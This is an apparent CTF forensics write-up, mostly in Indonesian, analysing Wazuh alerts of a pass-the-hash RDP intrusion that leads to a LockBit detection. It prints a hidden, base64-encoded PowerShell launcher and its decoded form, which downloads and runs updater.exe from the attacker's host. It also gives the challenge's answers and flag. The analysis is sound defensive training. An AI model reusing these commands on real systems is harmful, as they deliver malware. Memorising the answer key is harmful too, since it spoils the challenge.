# HunterStrike

**Deskripsi:**  
In the chaos of countless alerts, a predator moves unseen. Can you track its origin and deliver the strike?  

**Difficulty:** Easy  

- Diberikan file `HunterStrike.zip` yang berisi `alerts.json`.  
- Gunakan log tersebut untuk menjawab pertanyaan berikut.  

---

### 1. What is the device name of the attacker recorded in the event logs?  
**Format:** hostname  

Dari log berikut:  
```json
{"timestamp":"2025-08-13T08:14:34.891+0000","rule":{"level":6,"description":"Successful Remote Logon Detected - User:\\Bluecheap - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that DESKTOP-BRGFJOG is allowed to perform RDP connections","id":"92657","mitre":{"id":["T1550.002","T1078.002","T1021.001"],"tactic":["Defense Evasion","Lateral Movement","Persistence","Privilege Escalation","Initial Access"],"technique":["Pass the Hash","Domain Accounts","Remote Desktop Protocol"]},"firedtimes":1,"mail":false,"groups":["win_evt_channel","windows","\n      authentication_success","\n    "],"pci_dss":["10.2.5"],"gpg13":["7.1","7.2"],"gdpr":["IV_32.2"],"hipaa":["164.312.b"],"nist_800_53":["AU.14","AC.7"],"tsc":["CC6.8","CC7.2","CC7.3"]},"agent":{"id":"002","name":"DESKTOP-RL1K13Q","ip":"192.168.80.9"},"manager":{"name":"wazuh"},"id":"1755072874.11148436","full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4624\",\"version\":\"2\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2025-08-13T08:14:38.4357564Z\",\"eventRecordID\":\"32273\",\"processID\":\"724\",\"threadID\":\"5296\",\"channel\":\"Security\",\"computer\":\"DESKTOP-RL1K13Q\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"An account was successfully logged on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Information:\\r\\n\\tLogon Type:\\t\\t3\\r\\n\\tRestricted Admin Mode:\\t-\\r\\n\\tVirtual Account:\\t\\tNo\\r\\n\\tElevated Token:\\t\\tNo\\r\\n\\r\\nImpersonation Level:\\t\\tImpersonation\\r\\n\\r\\nNew Logon:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-2636795918-1848476775-1458562315-1001\\r\\n\\tAccount Name:\\t\\tBluecheap\\r\\n\\tAccount Domain:\\t\\tDESKTOP-RL1K13Q\\r\\n\\tLogon ID:\\t\\t0x68D4CC\\r\\n\\tLinked Logon ID:\\t\\t0x0\\r\\n\\tNetwork Account Name:\\t-\\r\\n\\tNetwork Account Domain:\\t-\\r\\n\\tLogon GUID:\\t\\t{00000000-0000-0000-0000-000000000000}\\r\\n\\r\\nProcess Information:\\r\\n\\tProcess ID:\\t\\t0x0\\r\\n\\tProcess Name:\\t\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tDESKTOP-BRGFJOG\\r\\n\\tSource Network Address:\\t192.168.80.13\\r\\n\\tSource Port:\\t\\t0\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\tNTLM V2\\r\\n\\tKey Length:\\t\\t128\\r\\n\\r\\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\\r\\n\\r\\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\\r\\n\\r\\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-5-21-2636795918-1848476775-1458562315-1001\",\"targetUserName\":\"Bluecheap\",\"targetDomainName\":\"DESKTOP-RL1K13Q\",\"targetLogonId\":\"0x68d4cc\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"DESKTOP-BRGFJOG\",\"logonGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"lmPackageName\":\"NTLM V2\",\"keyLength\":\"128\",\"processId\":\"0x0\",\"ipAddress\":\"192.168.80.13\",\"ipPort\":\"0\",\"impersonationLevel\":\"%%1833\",\"virtualAccount\":\"%%1843\",\"targetLinkedLogonId\":\"0x0\",\"elevatedToken\":\"%%1843\"}}}","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4624","version":"2","level":"0","task":"12544","opcode":"0","keywords":"0x8020000000000000","systemTime":"2025-08-13T08:14:38.4357564Z","eventRecordID":"32273","processID":"724","threadID":"5296","channel":"Security","computer":"DESKTOP-RL1K13Q","severityValue":"AUDIT_SUCCESS","message":"\"An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t3\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tNo\r\n\r\nImpersonation Level:\t\tImpersonation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-21-2636795918-1848476775-1458562315-1001\r\n\tAccount Name:\t\tBluecheap\r\n\tAccount Domain:\t\tDESKTOP-RL1K13Q\r\n\tLogon ID:\t\t0x68D4CC\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x0\r\n\tProcess Name:\t\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tDESKTOP-BRGFJOG\r\n\tSource Network Address:\t192.168.80.13\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\tNTLM V2\r\n\tKey Length:\t\t128\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\""},"eventdata":{"subjectUserSid":"S-1-0-0","subjectLogonId":"0x0","targetUserSid":"S-1-5-21-2636795918-1848476775-1458562315-1001","targetUserName":"Bluecheap","targetDomainName":"DESKTOP-RL1K13Q","targetLogonId":"0x68d4cc","logonType":"3","logonProcessName":"NtLmSsp","authenticationPackageName":"NTLM","workstationName":"DESKTOP-BRGFJOG","logonGuid":"{00000000-0000-0000-0000-000000000000}","lmPackageName":"NTLM V2","keyLength":"128","processId":"0x0","ipAddress":"192.168.80.13","ipPort":"0","impersonationLevel":"%%1833","virtualAccount":"%%1843","targetLinkedLogonId":"0x0","elevatedToken":"%%1843"}}},"location":"EventChannel"}
```
Terletak pada pesan
```
Verify that DESKTOP-BRGFJOG is allowed to perform RDP connections
```

✅ **Jawaban:** 
> DESKTOP-BRGFJOG  

---

### 2. What is the name of the account that was compromised during the incident?  
**Format:** username  

Dari log sebelumnya pada bagian `targetUserName`:  
```
"targetUserName":"Bluecheap"
```

✅ **Jawaban:** 
> Bluecheap  

---

### 3. What is the timestamp of the first successful authentication to the system?  
**Format:** yyyy-mm-ddThh:mm:ss  

Dari log berikut:  
```json
{"timestamp":"2025-08-13T08:14:35.349+0000","rule":{"level":3,"description":"Windows Logon Success","id":"60106","mitre":{"id":["T1078"],"tactic":["Defense Evasion","Persistence","Privilege Escalation","Initial Access"],"technique":["Valid Accounts"]},"firedtimes":7,"mail":false,"groups":["windows","windows_security","authentication_success"],"pci_dss":["10.2.5"],"gpg13":["7.1","7.2"],"gdpr":["IV_32.2"],"hipaa":["164.312.b"],"nist_800_53":["AU.14","AC.9"],"tsc":["CC6.8","CC7.2","CC7.3"]},"agent":{"id":"002","name":"DESKTOP-RL1K13Q","ip":"192.168.80.9"},"manager":{"name":"wazuh"},"id":"1755072875.11212593","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4624","version":"2","level":"0","task":"12544","opcode":"0","keywords":"0x8020000000000000","systemTime":"2025-08-13T08:14:38.8333557Z","eventRecordID":"32280","processID":"724","threadID":"5296","channel":"Security","computer":"DESKTOP-RL1K13Q","severityValue":"AUDIT_SUCCESS","message":"\"An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tDESKTOP-RL1K13Q$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t5\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nImpersonation Level:\t\tImpersonation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tSYSTEM\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E7\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x2c0\r\n\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t-\r\n\tSource Port:\t\t-\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tAdvapi  \r\n\tAuthentication Package:\tNegotiate\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\t-\r\n\tKey Length:\t\t0\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\""},"eventdata":{"subjectUserSid":"S-1-5-18","subjectUserName":"DESKTOP-RL1K13Q$","subjectDomainName":"WORKGROUP","subjectLogonId":"0x3e7","targetUserSid":"S-1-5-18","targetUserName":"SYSTEM","targetDomainName":"NT AUTHORITY","targetLogonId":"0x3e7","logonType":"5","logonProcessName":"Advapi","authenticationPackageName":"Negotiate","logonGuid":"{00000000-0000-0000-0000-000000000000}","keyLength":"0","processId":"0x2c0","processName":"C:\\\\Windows\\\\System32\\\\services.exe","impersonationLevel":"%%1833","virtualAccount":"%%1843","targetLinkedLogonId":"0x0","elevatedToken":"%%1842"}}},"location":"EventChannel"}
```
ambil bagian `systemTime`:
```
"systemTime":"2025-08-13T08:14:38.8333557Z"
```

✅ **Jawaban:** 
> 2025-08-13T08:14:38  

---

### 4. What is the URL from which the suspicious executable was downloaded?  
**Format:** http://xxx/xxx/file.ext  

📂 **Analisis:**  
Pada log PowerShell , terlihat penggunaan parameter `-EncodedCommand`. potongan log:    
```json
{"timestamp":"2025-08-13T08:42:21.005+0000","rule":{"level":12,"description":"Powershell.exe spawned a powershell process which executed a base64 encoded command","id":"92057","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":1,"mail":true,"groups":["sysmon","sysmon_eid1_detections","windows"]},"agent":{"id":"002","name":"DESKTOP-RL1K13Q","ip":"192.168.80.9"},"manager":{"name":"wazuh"},"id":"1755074541.11456929","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","providerGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","eventID":"1","version":"5","level":"4","task":"1","opcode":"0","keywords":"0x8000000000000000","systemTime":"2025-08-13T08:42:27.2750913Z","eventRecordID":"2935","processID":"3536","threadID":"3340","channel":"Microsoft-Windows-Sysmon/Operational","computer":"DESKTOP-RL1K13Q","severityValue":"INFORMATION","message":"\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-08-13 08:42:27.161\r\nProcessGuid: {59d32d4f-4ff3-689c-cd03-000000001600}\r\nProcessId: 5096\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AOAAwAC4AMQAzADoAOAAwADAAMAAvAHUAcABkAGEAdABlAHIALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABXAGkAbgBVAHAAZABhAHQAZQBTAHYAYwBcAHUAcABkAGEAdABlAHIALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABXAGkAbgBVAHAAZABhAHQAZQBTAHYAYwBcAHUAcABkAGEAdABlAHIALgBlAHgAZQAiAA==\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-RL1K13Q\\Bluecheap\r\nLogonGuid: {59d32d4f-4573-689c-72d7-2b0000000000}\r\nLogonId: 0x2BD772\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {59d32d4f-4beb-689c-8b03-000000001600}\r\nParentProcessId: 2456\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: DESKTOP-RL1K13Q\\Bluecheap\""},"eventdata":{"utcTime":"2025-08-13 08:42:27.161","processGuid":"{59d32d4f-4ff3-689c-cd03-000000001600}","processId":"5096","image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","fileVersion":"10.0.19041.3996 (WinBuild.160101.0800)","description":"Windows PowerShell","product":"Microsoft® Windows® Operating System","company":"Microsoft Corporation","originalFileName":"PowerShell.EXE","commandLine":"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoP -NonI -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AOAAwAC4AMQAzADoAOAAwADAAMAAvAHUAcABkAGEAdABlAHIALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABXAGkAbgBVAHAAZABhAHQAZQBTAHYAYwBcAHUAcABkAGEAdABlAHIALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABXAGkAbgBVAHAAZABhAHQAZQBTAHYAYwBcAHUAcABkAGEAdABlAHIALgBlAHgAZQAiAA==","currentDirectory":"C:\\\\Windows\\\\system32\\\\","user":"DESKTOP-RL1K13Q\\\\Bluecheap","logonGuid":"{59d32d4f-4573-689c-72d7-2b0000000000}","logonId":"0x2bd772","terminalSessionId":"1","integrityLevel":"High","hashes":"MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6","parentProcessGuid":"{59d32d4f-4beb-689c-8b03-000000001600}","parentProcessId":"2456","parentImage":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","parentCommandLine":"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"","parentUser":"DESKTOP-RL1K13Q\\\\Bluecheap"}}},"location":"EventChannel"}
```

Langkah decoding:  

1. Ekstrak nilai dari `-EncodedCommand`.  
2. Decode dari **Base64**.  
   - Command ini sebenarnya UTF-16 (Unicode) encoded sebelum di-Base64.  
3. Setelah decoding, hasilnya:  

```
Invoke-WebRequest -Uri "http://192.168.80.13:8000/updater.exe" -OutFile "C:\ProgramData\WinUpdateSvc\updater.exe"; Start-Process "C:\ProgramData\WinUpdateSvc\updater.exe"
```

✅ **Jawaban:** 
> http://192.168.80.13:8000/updater.exe  

---

### 5. What is the full path of the file downloaded and executed?  
**Format:** X:\xxx\xxx\xxx\file.ext  

Dari log sebelumnya:
```
Start-Process "C:\ProgramData\WinUpdateSvc\updater.exe"
```

✅ **Jawaban:** 
> C:\ProgramData\WinUpdateSvc\updater.exe  

---

### 6. Which MITRE ATT&CK technique ID describes the activity in the previous question?  
**Format:** XXXXX.XXX

Dari log sebelumnya:
```
"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}
```

✅ **Jawaban:** 
> T1059.001  

---

### 7. What is the name of the threat detected?  
**Format:** text  

Dari log Windows Defender:
```json
{"timestamp":"2025-08-13T08:53:35.985+0000","rule":{"level":12,"description":"Windows Defender: Antimalware platform detected  potentially unwanted software ()","id":"62123","firedtimes":1,"mail":true,"groups":["windows","windows_defender"],"pci_dss":["5.1","5.2","10.6.1","11.4"],"gpg13":["4.2"],"gdpr":["IV_35.7.d"],"hipaa":["164.312.b"],"nist_800_53":["SI.3","AU.6","SI.4"],"tsc":["A1.2","CC7.2","CC7.3","CC6.1","CC6.8"]},"agent":{"id":"002","name":"DESKTOP-RL1K13Q","ip":"192.168.80.9"},"manager":{"name":"wazuh"},"id":"1755075215.11573673","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-Windows Defender","providerGuid":"{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}","eventID":"1116","version":"0","level":"3","task":"0","opcode":"0","keywords":"0x8000000000000000","systemTime":"2025-08-13T08:53:30.7808885Z","eventRecordID":"674","processID":"3792","threadID":"5052","channel":"Microsoft-Windows-Windows Defender/Operational","computer":"DESKTOP-RL1K13Q","severityValue":"WARNING","message":"\"Microsoft Defender Antivirus has detected malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/Lockbit.AL&threatid=2147906306&enterprise=0\r\n \tName: Behavior:Win32/Lockbit.AL\r\n \tID: 2147906306\r\n \tSeverity: Severe\r\n \tCategory: Suspicious Behavior\r\n \tPath: behavior:_process: C:\\ProgramData\\WinUpdateSvc\\updater.exe, pid:3760:183288822648149; process:_pid:3760,ProcessStart:133995487691711444\r\n \tDetection Origin: Unknown\r\n \tDetection Type: Concrete\r\n \tDetection Source: Unknown\r\n \tUser: \r\n \tProcess Name: Unknown\r\n \tSecurity intelligence Version: AV: 1.435.146.0, AS: 1.435.146.0, NIS: 1.435.146.0\r\n \tEngine Version: AM: 1.1.25070.4, NIS: 1.1.25070.4\""},"eventdata":{"product Name":"Microsoft Defender Antivirus","product Version":"4.18.25030.2","detection ID":"{60C2395B-40EA-4F30-A8D8-01F688CC42F1}","detection Time":"2025-08-13T08:53:30.686Z","threat ID":"2147906306","threat Name":"Behavior:Win32/Lockbit.AL","severity ID":"5","severity Name":"Severe","category ID":"46","category Name":"Suspicious Behavior","fWLink":"https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Behavior:Win32/Lockbit.AL&amp;threatid=2147906306&amp;enterprise=0","status Code":"1","state":"1","source ID":"0","source Name":"Unknown","process Name":"Unknown","path":"behavior:_process: C:\\\\ProgramData\\\\WinUpdateSvc\\\\updater.exe, pid:3760:183288822648149; process:_pid:3760,ProcessStart:133995487691711444","origin ID":"0","origin Name":"Unknown","execution ID":"3","execution Name":"Executing","type ID":"0","type Name":"Concrete","pre Execution Status":"0","action ID":"9","action Name":"Not Applicable","error Code":"0x00000000","error Description":"The operation completed successfully.","post Clean Status":"0","additional Actions ID":"0","additional Actions String":"No additional actions required","security intelligence Version":"AV: 1.435.146.0, AS: 1.435.146.0, NIS: 1.435.146.0","engine Version":"AM: 1.1.25070.4, NIS: 1.1.25070.4"}}},"location":"EventChannel"}
```  
Pada bagian thread Name:
```
"product Name":"Microsoft Defender Antivirus","product Version":"4.18.25030.2","detection ID":"{60C2395B-40EA-4F30-A8D8-01F688CC42F1}","detection Time":"2025-08-13T08:53:30.686Z","threat ID":"2147906306","threat Name":"Behavior:Win32/Lockbit.AL"
```

✅ **Jawaban:** 
> Behavior:Win32/Lockbit.AL  

---

## 🎯 Flag
Flag muncul setelah semua pertanyaan berhasil dijawab: 

> HIDC2025{S3m0g4_H1dup_B41k_B41k_S4j4}  
